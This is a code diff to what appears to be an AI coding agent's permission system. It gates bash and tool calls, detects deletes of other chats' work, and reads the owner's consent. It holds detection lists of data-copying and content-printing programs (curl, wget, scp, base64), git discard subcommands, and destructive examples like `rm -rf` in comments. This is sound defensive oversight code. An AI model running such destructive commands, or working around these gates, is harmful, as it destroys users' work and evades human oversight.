+      const operands = inner.slice(1 + cleaner.sub.length).filter((word, i, all) => word !== UNKNOWN && word !== "--" && !word.startsWith("-") && !/^(-e|--exclude)$/.test(all[i - 1] ?? ""));
+      const roots = operands.length ? operands.map((word) => this.classify(word, at).path ?? word) : [at];
+      return { operand: { kinds: ["path"], tests: [], by: inner.slice(0, 2).join(" ") }, globs: roots.map((root) => `${root.replace(/\/+$/, "")}/**`) };
+    }
+    // A project's resources destroyed as a group (flow.ts `GROUP_DESTROYERS`: `docker compose down -v`).
+    const group = groupOperand(inner, item.cwd === undefined ? undefined : at);
+    if (group) return { operand: group, globs: [] };
+    const operand = runtimeOperand(commands, index, inner);
+    if (!operand) return undefined;
+    const globs: string[] = [];
+    if (operand.kinds.includes("path") || operand.kinds.includes("worktree")) {
+      // The producer: `find` itself for `-exec`, else the pipeline or substitution right before it.
+      let start = index;
+      while (start > 0 && (commands[start - 1].joint === "|" || commands[start - 1].joint === undefined)) start--;
+      const pipe = /^(find|gfind)$/.test(first) ? [item] : commands.slice(start, index);
+      const set = pipe.length ? listingSet(pipe) : undefined;
+      for (const entry of set ?? []) {
+        const pattern = entry.subtree && !/[*?[]/.test(entry.pattern) ? `${entry.pattern.replace(/\/+$/, "")}/**` : entry.pattern;
+        const resolved = resolvePattern(pattern, { home: this.home, cwd: this.paths.canonical(entry.cwd ?? at, this.cwd) });
+        if (!resolved.anywhere) globs.push(...resolved.globs);
+      }
+    }
+    return { operand, globs };
+  }
+
+  /** Whether a command destroys what it names (round 6, W3): a delete, erase or stop by the program tables or the catalogue, a move away. */
+  private destroys(item: LineCommand): boolean {
+    const inner = unwrapped(item.words);
+    const removal = remoteEffect(inner);
+    if (removal && /^(delete|erase|destroy|stop)$/.test(removal.action)) return true;
+    const row = readTool(inner);
+    if (row && "row" in row && /^(delete|erase|destroy|stop)$/.test(row.row.action)) return true;
+    if (basename(inner[0] ?? "") === "mv" || inner.includes("-delete")) return true;
+    // A REST call that deletes or closes what its route names (schema.ts `apiDestroys`, round 6 step 2).
+    if (apiDestroys(inner)) return true;
+    // A schema-typed tool's subcommand whose verb deletes or kills (`tmux kill-session -t X`; iteration 2).
+    const typed = typedTargets(inner);
+    if (typed?.targets.length && DELETING_SUBCOMMAND.test(inner.slice(1).find((word) => !word.startsWith("-")) ?? "")) return true;
+    const operation = targetsOf(item, this.catalogueFacts())?.op;
+    return operation === "destroy" || operation === "stop";
+  }
+
+  /** A bash line as an action class (`lineClass`), for `gate`. */
+  lineClassOf(command: string, cwd: string): ActionClass {
+    const line = this.assess(command, cwd);
+    return this.lineClass(line, command, cwd, undefined);
+  }
+
+  /**
+   * `gate` for a bash line that would run without review (round 6, W1): one a saved rule allows outside the
+   * sandbox or that only inspects (`bash:outside`: the whole floor, the line's own findings too), or one that
+   * runs in the sandbox (`bash:sandbox`: denials and other tasks' work; the sandbox itself keeps secrets and
+   * the permission system out of its reach). Reads the line only when a denial or another chat's ledger exists.
+   */
+  async gateLine(entry: "bash:outside" | "bash:sandbox" | "bash:escalate", command: string, cwd: string): Promise<FloorHit | undefined> {
+    const line = entry === "bash:outside" ? this.assess(command, cwd) : undefined;
+    const own = line ? this.alwaysAsk(line) : undefined;
+    // Cheap first: with no denial, only a line that destroys something can meet another chat's work.
+    const read = line ?? (this.denials.any() || this.othersMade().length ? this.assess(command, cwd) : undefined);
+    if (!own && !this.denials.any() && (!read || !this.othersMade().length || !read.commands.some((item, index) => this.destroys(item) || this.runtimeOf(read.commands, index, cwd) !== undefined || this.runsScript(item) || gitDiscards(unwrapped(item.words)) !== undefined))) {
+      this.gated?.push({ entry });
+      return undefined;
+    }
+    const cls = this.lineClass(read ?? this.assess(command, cwd), command, cwd, undefined);
+    const hit = await this.gate(entry, cls);
+    return own ?? hit;
+  }
+
+  /** `gate` for a tool call (MCP, extension) its setting or an earlier approval allows. */
+  async gateTool(entry: "tool:setting" | "tool:approval", name: string, input: unknown): Promise<FloorHit | undefined> {
+    // Round 6 step 2: the floor too, not only denials — the files its input names (`toolPaths`), by what its name says it does.
+    const cls = this.toolClass(name, input);
+    const typed = cls.units.slice(1);
+    const changes = typed.filter((unit) => unit.effects.includes("change"));
+    const system = changes.flatMap((unit) => unit.scopes).find((scope) => this.riskFacts().permissionSystem?.(scope.name));
+    if (!this.denials.any() && !system && !((typed.some((unit) => unit.destroys) || changes.length) && this.othersMade().length)) {
+      this.gated?.push({ entry });
+      return undefined;
+    }
+    return this.gate(entry, cls, system ? { permissionSystemPath: displayPath(system.name, this.home) } : {});
+  }
+
+  /**
+   * The files a tool's input names (round 6 step 2, data): string values under keys that name a file (`TOOL_PATH_KEYS`)
+   * or shaped like one (absolute, `~/`, `file://`), canonical; and what the tool's name says it does to them
+   * (`TOOL_VERBS`): a write changes, a delete or move destroys, anything else reads. Undefined effect words: read.
+   */
+  private toolPaths(name: string, input: unknown): { effects: EffectClass[]; destroys: boolean; paths: string[] } {
+    const paths: string[] = [];
+    const visit = (value: unknown, key: string, depth: number) => {
+      if (depth > 4 || paths.length >= 32) return;
+      if (typeof value === "string") {
+        const uri = /^file:\/\//i.test(value) ? decodeURIComponent(value.replace(/^file:\/\/(localhost)?/i, "")) : undefined;
+        const shaped = uri ?? (value.startsWith("/") || value.startsWith("~/") ? value : TOOL_PATH_KEYS.test(key) && value.length < 1024 && !/\s{2}|\n/.test(value) && !/^[a-z][\w+.-]*:\/\//i.test(value) ? value : undefined);
+        if (shaped) paths.push(this.classify(shaped, this.cwd).path);
+      } else if (Array.isArray(value)) for (const item of value) visit(item, key, depth + 1);
+      else if (value && typeof value === "object") for (const [k, v] of Object.entries(value)) visit(v, k, depth + 1);
+    };
+    visit(input, "", 0);
+    const words = name.toLowerCase().split(/[^a-z]+|(?<=[a-z])(?=[A-Z])/);
+    const destroys = words.some((word) => TOOL_VERBS.destroy.includes(word));
+    const changes = destroys || words.some((word) => TOOL_VERBS.change.includes(word));
+    return { effects: [changes ? "change" : "read"], destroys, paths: [...new Set(paths)] };
+  }
+
+  /**
+   * The floor's `other-task` detail for what a request destroys (round 6, W3): an entity of any kind that
+   * another chat's ledger says it made or started — the same entity, one inside it, or one a glob of the
+   * request could match — and that this chat's own ledger doesn't hold, its task (`taskId`) isn't the other
+   * chat's, and the owner's words don't name. Only destroying effects (`DenialUnit.destroys`: delete, erase,
+   * move away, stop); a change of a file's contents is no destruction.
+   *
+   * `review` instead of `floor` (round 6 narrowing): when the lineage is unknown (this chat or the other chat's
+   * entry has no task id), a kind round 6 first brought under the floor that has a place in the file system
+   * (ledger.ts `OTHER_TASK_FLOOR`: `since: 6`, `located`), destroyed inside this chat's own working tree
+   * (`inWorkingTree`), is the judge's to decide, with "another chat made it" as evidence. Elsewhere (/tmp, another
+   * worktree), with both task ids known and different, and for every kind the floor held before, it floors.
+   */
+  private async otherTaskOf(cls: ActionClass): Promise<{ floor?: string; review?: string } | undefined> {
+    const units = cls.units.filter((unit) => unit.destroys);
+    // Content writes (final pass): a change of a file inside a working tree another task made, outside this chat's own.
+    const writes = cls.units
+      .filter((unit) => !unit.destroys && unit.effects.includes("change"))
+      .flatMap((unit) => unit.scopes.filter((scope) => scope.kind === "path" && !scope.glob).map((scope) => scope.name))
+      .filter((path) => !this.inOwnTrees(path));
+    if (!units.length && !writes.length) return undefined;
+    const others = this.othersMade()
+      .map((entry) => {
+        const kind = ledgerKind(entry.kind) ?? entry.kind;
+        return { ...entry, kind, name: kind === "path" || kind === "worktree" ? this.paths.canonical(entry.name, this.cwd) : entry.name };
+      })
+      .filter((entry) => taskRelation(this.taskId, entry.task) !== "same");
+    if (!others.length) return undefined;
+    // Held for review, not the floor: lineage unknown, a kind new to the floor in round 6 with a place, and what is
+    // destroyed (the entity, or the folder holding it that the request names) inside this chat's working tree.
+    const reviewed = (entry: LedgerEntry, destroyed: string): boolean => {
+      const row = OTHER_TASK_FLOOR[entry.kind];
+      return row?.since === 6 && row.located && taskRelation(this.taskId, entry.task) === "unknown" && this.inWorkingTree(entry.name) && this.inWorkingTree(destroyed);
+    };
+    const found = (): { what: string; why: string; review: boolean }[] => {
+      const out: { what: string; why: string; review: boolean }[] = [];
+      const seen = new Map<string, { review: boolean }>();
+      const note = (entry: LedgerEntry, how: string, destroyed: string) => {
+        const what = `${entry.kind} ${entry.name}`;
+        const review = reviewed(entry, destroyed);
+        const before = seen.get(what);
+        // The same entity reached two ways: the floor's way wins.
+        if (before) {
+          if (before.review && !review) before.review = false;
+          return;
+        }
+        if (this.ownerNames([entry.name, basename(entry.name)]) !== undefined) return;
+        const item = { what, why: `another chat (${entry.chatId ?? "unknown"}) ${entry.action === "start" ? "started" : "made"} it${how}`, review };
+        seen.set(what, item);
+        out.push(item);
+      };
+      // Another task's working tree is its work in progress: a write into it is no less its resource than a delete.
+      for (const path of writes) {
+        if (this.created.ledger.covers({ kind: "path", name: path })) continue;
+        for (const entry of others) {
+          if (entry.kind !== "worktree" && !(entry.kind === "path" && isCheckout(entry.name))) continue;
+          if (path === entry.name || isUnder(path, entry.name)) note(entry, `; this writes ${displayPath(path, this.home)} in that working tree`, path);
+        }
+      }
+      for (const unit of units) {
+        for (const scope of unit.scopes) {
+          // A glob's fixed folder is where it looks, not what it destroys: its globs say that (below).
+          if (scope.kind === "line" || scope.glob) continue;
+          const kind = ledgerKind(scope.kind);
+          if (!kind) continue;
+          const target: LedgerEntity = { kind, name: scope.name };
+          if (this.created.ledger.covers(target)) continue;
+          for (const entry of others) {
+            const made = { ...entry, repo: undefined, remote: undefined };
+            if (entryCovers(made, target)) note(entry, "", target.name);
+            else if ((kind === "path" || kind === "worktree") && (made.kind === "path" || made.kind === "worktree") && isUnder(made.name, target.name)) note(entry, `, inside ${scope.name}`, target.name);
+            // What it destroys inside another task's working tree (iteration 4: `rsync --delete SRC OTHER/src/`, `rm -rf
+            // OTHER/src`), as a write into it is (b6-178): outside this chat's own trees.
+            else if ((kind === "path" || kind === "worktree") && (made.kind === "worktree" || (made.kind === "path" && isCheckout(made.name))) && isUnder(target.name, made.name) && !this.inOwnTrees(target.name)) note(entry, `; this destroys ${displayPath(target.name, this.home)} in that working tree`, target.name);
+          }
+        }
+        // Operands known only when it runs (flow.ts): another chat's entity of a kind they take, passing every producer test.
+        for (const operand of unit.runtime ?? []) {
+          for (const entry of others) {
+            // Files by their globs (above); a worktree by what lists it (`git worktree list | awk …`), as a named entity,
+            // unless the unit has globs (a listing's roots, its own patterns: round 6 narrowing): then by those, as a file.
+            if (entry.kind === "path" || (entry.kind === "worktree" && unit.globs?.length) || !operand.kinds.includes(entry.kind)) continue;
+            if (this.created.ledger.covers({ kind: entry.kind, name: entry.name })) continue;
+            const also = this.entityForms(entry);
+            if (operand.tests.every((test) => passes(test, entry.kind, entry.name, also))) note(entry, `, which \`${operand.by}\` could be handed`, entry.name);
+          }
+        }
+        for (const glob of unit.globs ?? []) {
+          for (const entry of others) {
+            if (entry.kind !== "path" && entry.kind !== "worktree") continue;
+            if (this.created.ledger.covers({ kind: entry.kind, name: entry.name })) continue;
+            if (globsIntersect(glob, entry.name) || globsIntersect(`${glob.replace(/\/+$/, "")}/**`, entry.name)) note(entry, `, which ${glob} matches`, entry.name);
+            // What the glob matches inside another task's working tree (`find .. -name node_modules -exec rm -rf {} +` over its
+            // worktree): part of its work in progress (iteration 2). A folder it made keeps the narrower reading (its own names).
+            else if (entry.kind === "worktree" && globsIntersect(glob, `${entry.name.replace(/\/+$/, "")}/**`)) note(entry, `: ${glob} matches inside it`, entry.name);
+          }
+        }
+      }
+      return out;
+    };
+    let hits = found();
+    if (hits.length && this.ownerWordsNow) {
+      await this.refreshOwnerWords();
+      hits = found();
+    }
+    if (!hits.length) return undefined;
+    const floored = hits.filter((item) => !item.review);
+    const words = (items: typeof hits) => items.map((item) => `${item.what} (${item.why})`).join("; ");
+    return floored.length ? { floor: words(floored) } : { review: words(hits) };
+  }
+
+  /**
+   * Whether `path` lies inside this chat's own working tree (its cwd's git worktree, or the cwd without git;
+   * `baseRoots`), and is not the tree itself.
+   */
+  private inWorkingTree(path: string): boolean {
+    return this.baseRoots.some((root) => path !== root && isUnder(path, root));
+  }
+
+  /**
+   * What else another chat's entity is known by, for the name tests of a runtime operand (final pass, flow.ts
+   * `passes`): a process by the command that started it (the ledger's `by`) and its live description
+   * (`processForms`: command line, listening ports). Other kinds by their names alone.
+   */
+  private entityForms(entry: LedgerEntry): string[] {
+    if (entry.kind !== "process") return [];
+    const pid = Number(entry.name);
+    return [...(entry.by ? [entry.by] : []), ...this.processForms(pid)];
+  }
+
+  /** A live process's description (`processDescription`); the eval's fake machine replaces it. */
+  processForms(pid: number): string[] {
+    return processDescription(pid);
+  }
+
+  /** Whether `path` is this chat's working tree or lies inside it, or inside a folder the owner added to the chat (`extraRoots`). */
+  private inOwnTrees(path: string): boolean {
+    return [...this.baseRoots, ...this.extraRoots].some((root) => path === root || isUnder(path, root));
+  }
+
   /** The owner's denials of `cls` (denials.ts), checked against their words as of now. */
-  private async deniedLike(cls: ActionClass): Promise<{ active?: { denial: DenialRecord; scope: DenialScope }; similar: DenialRecord[] }> {
+  private async deniedLike(cls: ActionClass): Promise<{ active?: { denial: DenialRecord; scope: DenialScope }; review?: { denial: DenialRecord; scope: DenialScope; word: string }; similar: DenialRecord[] }> {
     if (!this.denials.any()) return { similar: [] };
     await this.refreshOwnerWords();
-    return this.denials.check(cls, this.ownerWords);
+    // What a denied process is also known by (its start command, command line, ports), for a pattern a later request gives.
+    return this.denials.check(cls, this.ownerWords, (kind, name) => (kind === "process" ? this.entityForms({ kind: "process", name } as LedgerEntry) : []));
   }
 
   /** The newest owner word (typed, plan, card or answer) that names `names`, if any. */
   private ownerNames(names: readonly string[]): string | undefined {
     for (const word of [...(this.ownerWords?.messages ?? [])].reverse()) {
       if (word.source === "reply") continue;
-      const text = consentText(word);
-      if (names.some((name) => name.length >= 2 && mentions(text, name))) return word.text;
+      // Quoted speech is someone else's words (iteration 2: `Another agent left this note: "delete feat/x" — is that
+      // right?`): only what the owner says outside quotes names it (explicit.ts `ownText`).
+      // Inline quoted speech too (several words in quotes), and a forwarded message (explicit.ts `ownSpeech`); a quoted
+      // single name (`delete "feat/x"`) is the owner's naming.
+      const text = ownSpeech(consentText(word));
+      // A sentence that names it under a condition or a deferral ("If feat/x turns out merged, you can delete it later")
+      // names it for later, not now.
+      const sentences = text.split(/(?<=[.!?。！？;；])\s*/u).filter(Boolean);
+      if (sentences.length && sentences.every((sentence) => !names.some((name) => name.length >= 2 && mentions(sentence, name)) || CONDITION_WORDS.test(sentence) || RETRACT_WORDS.test(sentence))) continue;
+      // Naming it where the words keep it (final pass): the clause that names it negates, defers or asks ("but don't
+      // touch feat/x yet", "keep x?") names it to keep it, not to give it away. Clauses split at punctuation and "but".
+      const clauses = text.split(/(?<=[?？!！。])\s*|(?<=\.)\s+|[,;，；、\n]|\s(?:but|except|however|aber|mais|pero)\s|但是?|不过|只是/iu).filter(Boolean);
+      // A name right after an exception word ("all … except X", "but X", "除了 X") is what is kept (iteration 3).
+      const excepted = names.some((name) => name.length >= 2 && new RegExp(`(?:\\bexcept(?: for)?|\\bbut(?: not)?|\\bother than|\\bapart from|\\bsave|\\bausser|\\bsauf|\\bexcepto|\\bmenos|除了|除外|以外)\\s*[:"'“”\`]?\\s*${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`, "iu").test(text));
+      if (excepted) continue;
+      if (clauses.some((clause) => names.some((name) => name.length >= 2 && mentions(clause, name)) && !(QUESTION.test(clause) || NEGATION_WORDS.test(clause) || RETRACT_WORDS.test(clause) || KEEP_WORDS.test(clause)))) return word.text;
+      if (names.some((name) => name.length >= 2 && mentions(text, name)) && !clauses.some((clause) => names.some((name) => name.length >= 2 && mentions(clause, name)))) {
+        if (!(QUESTION.test(text) || NEGATION_WORDS.test(text) || RETRACT_WORDS.test(text))) return word.text;
+      }
     }
     return undefined;
   }
@@ -2605,7 +3929,9 @@ export class Permissions {
           if (!line.trim()) continue;
           try {
             const entry = JSON.parse(line) as LedgerEntry;
-            if (entry && typeof entry.kind === "string" && typeof entry.name === "string" && (entry.action ?? "create") !== "merge") entries.push({ ...entry, chatId: entry.chatId ?? name.replace(/\.jsonl$/, "") });
+            const kind = entry && typeof entry.kind === "string" ? ledgerKind(entry.kind) : undefined;
+            // One task's chats (a workspace and its threads, a plan's sessions) are no other task (round 6, W3).
+            if (kind && typeof entry.name === "string" && (entry.action ?? "create") !== "merge" && taskRelation(this.taskId, entry.task) !== "same") entries.push({ ...entry, kind, chatId: entry.chatId ?? name.replace(/\.jsonl$/, "") });
           } catch {
             // A torn line: skipped.
           }
@@ -2648,6 +3974,37 @@ export class Permissions {
       if (!why) continue;
       const named = this.ownerNames([target.value, basename(target.value)]);
       out.push({ what: `${target.kind} ${target.value}`, why, ...(named ? { named } : {}) });
+    }
+    return out;
+  }
+
+  /**
+   * The entities of a cluster or cloud kind (`OTHER_TASK_FLOOR` since 6, no place) a line deletes or stops
+   * (`DESTROYING_ACTIONS`) that this chat's ledger doesn't hold and no other chat's ledger names (`notThisTask` found
+   * none): their origin is unknown to the code (another task's, made before ledgers,
+   * or by hand). Files are left out (whether a file is the task's is the working tree's question), and processes (their
+   * facts tell whose they are).
+   */
+  private originUnknown(targets: readonly Target[], known: readonly string[], line?: LineAssessment): string[] {
+    const out: string[] = [];
+    // The kinds the line's schema types its targets as (schema.ts): a namespace, not the generic resource.
+    const typed = new Map<string, string>();
+    for (const item of line?.commands ?? []) for (const target of typedTargets(unwrapped(item.words))?.targets ?? []) typed.set(target.name, target.kind);
+    for (const target of targets) {
+      // Processes are told by their facts (whose marker, which program), not by a ledger.
+      if (!DESTROYING_ACTIONS.test(target.action) || target.kind === "path" || target.kind === "worktree" || target.kind === "process" || target.value === UNKNOWN) continue;
+      const kind = ledgerKind(typed.get(target.value) ?? target.entity?.kind ?? target.kind) ?? (target.kind as LedgerEntity["kind"]);
+      // Only the kinds the floor first held in round 6 that have no place (ledger.ts OTHER_TASK_FLOOR: a cluster's
+      // namespace, context, cluster, a bucket, a cloud project): made by cluster and cloud tools whose making is often
+      // in no chat's ledger here, and with no provenance line in the prompt before. Branches, pull requests, simulators,
+      // containers keep the evidence they had (the grade, "What this task did itself").
+      const row = OTHER_TASK_FLOOR[kind];
+      if (!row || row.since !== 6 || row.located) continue;
+      const what = `${kind} ${target.value}`;
+      if (known.includes(what) || known.includes(`${target.kind} ${target.value}`) || out.includes(what)) continue;
+      // `resource` is the kind of what no table types more narrowly: it may be this chat's entry of any kind by that name.
+      if (this.created.ledger.covers({ kind, name: target.value }) || this.created.ledger.all().some((entry) => entry.name === target.value && (entry.kind === kind || entry.kind === "resource" || kind === "resource"))) continue;
+      out.push(what);
     }
     return out;
   }
@@ -3668,12 +5025,161 @@ export function toolOverride(config: PermissionsConfig, name: string, server: st
   return config.tools.overrides[name] ?? (server ? config.tools.overrides[`mcp:${server}`] : undefined) ?? config.tools.mcp;
 }
 
+/** The command a launchd plist runs (`ProgramArguments`, else `Program`), as a shell line; `sh -c CMD` is CMD. */
+function plistCommand(text: string): string | undefined {
+  const decode = (value: string) => value.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&apos;/g, "'").replace(/&amp;/g, "&");
+  const array = /<key>\s*ProgramArguments\s*<\/key>\s*<array>([\s\S]*?)<\/array>/.exec(text)?.[1];
+  const args = array ? [...array.matchAll(/<string>([\s\S]*?)<\/string>/g)].map((match) => decode(match[1])) : [];
+  if (args.length >= 3 && /(^|\/)(sh|bash|zsh|dash)$/.test(args[0]) && args[1] === "-c") return args[2];
+  if (args.length) return args.map((arg) => (/^[\w@%+=:,./-]+$/.test(arg) ? arg : `'${arg.replaceAll("'", `'\\''`)}'`)).join(" ");
+  const program = /<key>\s*Program\s*<\/key>\s*<string>([\s\S]*?)<\/string>/.exec(text)?.[1];
+  return program ? decode(program) : undefined;
+}
+
+/**
+ * git subcommands that discard a work tree's uncommitted work (iteration 2, data): `reset --hard|--merge|--keep`,
+ * `checkout -f|-- PATHS|.`, `restore` (without `--staged` alone), `clean -f`, `stash` (it takes the work away),
+ * `switch -f|--discard-changes`. With the tree it works on (`-C DIR`; else its folder).
+ */
+function gitDiscards(words: readonly string[]): { dir?: string; sub: string } | undefined {
+  if (basename(words[0] ?? "") !== "git") return undefined;
+  let i = 1;
+  let dir: string | undefined;
+  for (; i < words.length && words[i].startsWith("-"); i++) {
+    if (words[i] === "-C") dir = words[++i];
+    else if (/^(-c|--git-dir|--work-tree)$/.test(words[i])) i++;
+  }
+  const sub = words[i];
+  const rest = words.slice(i + 1);
+  const has = (re: RegExp) => rest.some((word) => re.test(word));
+  const discards =
+    (sub === "reset" && has(/^--(hard|merge|keep)$/)) ||
+    (sub === "checkout" && (has(/^(-f|--force)$/) || rest.includes("--") || rest.includes("."))) ||
+    (sub === "restore" && !(rest.includes("--staged") && !rest.includes("--worktree"))) ||
+    (sub === "clean" && has(/^-[a-zA-Z]*f/)) ||
+    (sub === "stash" && !/^(list|show|apply|branch)$/.test(rest[0] ?? "")) ||
+    (sub === "switch" && has(/^(-f|--force|--discard-changes)$/));
+  return discards ? { ...(dir !== undefined ? { dir } : {}), sub } : undefined;
+}
+
+/** A reader glob for the dialog (markers spelled out). */
+function shownGlob(pattern: string): string {
+  return pattern.replaceAll("\u0001", "…");
+}
+
+/** Package runners and the words before the package they run (data). */
+const PACKAGE_RUNNERS: readonly { program: string; sub: readonly string[] }[] = [
+  { program: "npx", sub: [] }, { program: "bunx", sub: [] }, { program: "uvx", sub: [] }, { program: "pnpx", sub: [] },
+  { program: "pnpm", sub: ["dlx"] }, { program: "pnpm", sub: ["exec"] }, { program: "npm", sub: ["exec"] }, { program: "yarn", sub: ["dlx"] },
+  { program: "pipx", sub: ["run"] }, { program: "uv", sub: ["run"] }, { program: "uv", sub: ["tool", "run"] }, { program: "poetry", sub: ["run"] }, { program: "pdm", sub: ["run"] }, { program: "hatch", sub: ["run"] },
+];
+
+/** Options whose value is a command the program runs, whichever program it is (data). */
+const RUN_OPTIONS = /^(--pre|--exec|--exec-batch|-x|-X|--command|-c|--run|--shell-command|--on-change|--onchange)$/;
+
+/** Programs that copy from sources to a destination (their last operand after a remote one is written here). */
+const COPIERS: ReadonlySet<string> = new Set(["cp", "scp", "rsync", "sftp", "aws", "gsutil", "gcloud", "az", "azcopy", "rclone", "mc", "s3cmd", "curl", "wget", "kubectl", "docker", "podman", "gh"]);
+
+/** Programs whose output is what they read (a file's content, or an encoding of it), not its name or size. */
+const CONTENT_PRINTERS: ReadonlySet<string> = new Set(["cat", "tac", "head", "tail", "base64", "base32", "xxd", "od", "hexdump", "gzip", "zcat", "bzip2", "xz", "zstd", "lz4", "tar", "zip", "openssl", "gpg", "age", "sed", "awk", "gawk", "grep", "egrep", "rg", "cut", "tr", "sort", "uniq", "strings", "jq", "yq", "dd", "iconv", "envsubst", "tee", "less", "more", "rev", "fold", "nl", "paste"]);
+
+/** Programs that hand their input to the program they run (flow.ts feeders): that program is the consumer. */
+const FEEDER_NAMES: ReadonlySet<string> = new Set(["xargs", "parallel"]);
+
+/** The files a feeder reads its names from (`xargs -a F`, `--arg-file=F`, `parallel -a F`, `:::: F`). */
+function feederArgFiles(words: readonly string[]): string[] {
+  const program = basename(words[0] ?? "");
+  if (program !== "xargs" && program !== "parallel") return [];
+  const out: string[] = [];
+  for (let i = 1; i < words.length; i++) {
+    const word = words[i];
+    if (word === "-a" || word === "--arg-file" || (program === "parallel" && word === "::::")) {
+      if (words[i + 1] !== undefined && words[i + 1] !== UNKNOWN) out.push(words[i + 1]);
+      i++;
+    } else if (word.startsWith("--arg-file=")) out.push(word.slice("--arg-file=".length));
+    else if (/^-a./.test(word)) out.push(word.slice(2));
+  }
+  return out;
+}
+
+/** A command whose program an assignment in front of it hides (shell.ts: the word is unknown, its name the hint). */
+function hiddenBehindEnv(command: SimpleCommand): boolean {
+  return command.words[0] === UNKNOWN && command.env.length > 0 && typeof command.hints?.[0] === "string" && /^[\w.+/-]+$/.test(command.hints[0]);
+}
+
+/** The command with its hidden program shown (`hiddenBehindEnv`). */
+function revealProgram(command: SimpleCommand): SimpleCommand {
+  if (!hiddenBehindEnv(command)) return command;
+  return { ...command, words: [command.hints![0]!, ...command.words.slice(1)], hints: [undefined, ...command.hints!.slice(1)] };
+}
+
+/** The variables assigned in front of a command (`NAME=value cmd`) whose values are known, by name. */
+function envPrefixOf(item: { env: readonly string[]; envValues?: readonly string[] }): { name: string; value: string }[] {
+  return (item.envValues ?? []).flatMap((value, at) => (item.env[at] !== undefined && value !== UNKNOWN ? [{ name: item.env[at], value }] : []));
+}
+
+/**
+ * How a builtin moves the shell (final pass, data): to a literal folder (`cd [-L|-P|-e|-@] DIR`, `pushd [-n] DIR`;
+ * `pushd` keeps where it was), or back (`popd`). Undefined: where it goes is known only when it runs.
+ */
+function directoryMove(words: readonly string[]): { to?: string; push?: boolean; pop?: boolean } | undefined {
+  const [program, ...args] = words;
+  if (program === "popd") return args.every((arg) => arg === "-q") ? { pop: true } : undefined;
+  if (program !== "cd" && program !== "pushd") return undefined;
+  const operands = args.filter((arg) => !(program === "cd" ? /^-[LPe@]+$/ : /^-q$/).test(arg));
+  if (operands.length !== 1) return undefined;
+  const target = operands[0];
+  if (target === UNKNOWN || target === "-" || /^[+-]\d+$/.test(target) || target.startsWith("-")) return undefined;
+  return { to: target, ...(program === "pushd" ? { push: true } : {}) };
+}
+
+/** The lexicon's negation and retraction/deferral words, every language (ownerNames). */
+const NEGATION_WORDS = listWords("negate");
+const RETRACT_WORDS = listWords("retract");
+
+
+/** A target's actions that delete or stop it (explicit.ts `Target.action`). */
+const DESTROYING_ACTIONS = /^(delete|destroy|erase|remove|stop|kill|close|uninstall|prune)$/;
+
+/** Whether a folder is a git working tree (a clone or a worktree: it holds `.git`). */
+function isCheckout(path: string): boolean {
+  try {
+    return existsSync(join(path, ".git"));
+  } catch {
+    return false;
+  }
+}
+
 /** Paths an apply_patch input touches (add, update, delete, move target). */
 export function patchPaths(patch: string): string[] {
-  const out: string[] = [];
+  return patchOps(patch).map((item) => item.path);
+}
+
+/**
+ * What an apply_patch input does to each path (final pass): the patch format's file operations as data
+ * (`PATCH_OPS`): an added or updated file changes, a deleted one is deleted, an updated one with a `*** Move to:`
+ * is moved away (its source destroyed) and the target changes.
+ */
+const PATCH_OPS: Readonly<Record<string, "change" | "delete" | "move-from" | "move-to">> = {
+  "Add File": "change",
+  "Update File": "change",
+  "Delete File": "delete",
+  "Move to": "move-to",
+};
+
+export function patchOps(patch: string): { path: string; op?: "delete" | "move" }[] {
+  const out: { path: string; op?: "delete" | "move" }[] = [];
   for (const line of patch.split(/\r?\n/)) {
-    const match = line.trim().match(/^\*\*\* (?:Add File|Delete File|Update File|Move to): (.+)$/);
-    if (match) out.push(match[1].trim());
+    const match = line.trim().match(/^\*\*\* (Add File|Delete File|Update File|Move to): (.+)$/);
+    if (!match) continue;
+    const kind = PATCH_OPS[match[1]];
+    const path = match[2].trim();
+    if (kind === "move-to") {
+      // The file the update named is moved away from where it was.
+      const source = out.at(-1);
+      if (source && source.op === undefined) source.op = "move";
+      out.push({ path });
+    } else out.push({ path, ...(kind === "delete" ? { op: "delete" as const } : {}) });
   }
   return out;
 }
